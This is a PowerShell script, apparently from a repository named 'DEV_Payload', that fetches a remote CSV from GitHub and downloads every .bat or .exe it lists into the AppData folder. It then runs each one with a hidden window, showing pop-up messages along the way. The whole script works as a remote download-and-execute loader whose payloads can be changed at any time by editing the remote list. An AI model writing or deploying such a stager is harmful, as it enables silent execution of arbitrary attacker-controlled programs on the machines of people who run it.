# ================================================
# UNIVERSAL WATCHER - CSV Download & Executor
# ================================================

Add-Type -AssemblyName PresentationFramework

# CSV file URL
$CsvUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/Excel/Installer_Path.csv?nocache=$([guid]::NewGuid())"

# Download location
$DownloadDir = [Environment]::GetFolderPath("ApplicationData")

try {
    [System.Windows.MessageBox]::Show("Downloading installer list...", "Dynamic Watcher")
    Write-Host "Fetching $CsvUrl"

    # Download CSV content
    $csvContent = Invoke-WebRequest -Uri $CsvUrl -UseBasicParsing
    $rows = $csvContent.Content | ConvertFrom-Csv

    foreach ($row in $rows) {
        $id = $row.Id
        $url = $row.'Executor Path'
        $type = $row.'Executor Type'
        $status = $row.Status.Trim().ToUpper()

        if ($status -eq "TRUE") {
            $fileName = [System.IO.Path]::GetFileName($url)
            $targetPath = Join-Path -Path $DownloadDir -ChildPath $fileName

            [System.Windows.MessageBox]::Show("Downloading: $url", "Dynamic Watcher")
            Write-Host "Downloading $url to $targetPath"

            Invoke-WebRequest -Uri $url -OutFile $targetPath -UseBasicParsing

            [System.Windows.MessageBox]::Show("Downloaded: $fileName`nExecuting...", "Dynamic Watcher")

            switch ($type.ToLower()) {
                ".bat" {
                    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$targetPath`"" -WindowStyle Hidden
                }
                ".exe" {
                    Start-Process -FilePath $targetPath -WindowStyle Hidden
                }
                default {
                    [System.Windows.MessageBox]::Show("Unknown executor type: $type", "Dynamic Watcher")
                }
            }
        }
    }
} catch {
    [System.Windows.MessageBox]::Show("ERROR: $($_.Exception.Message)", "Dynamic Watcher")
}
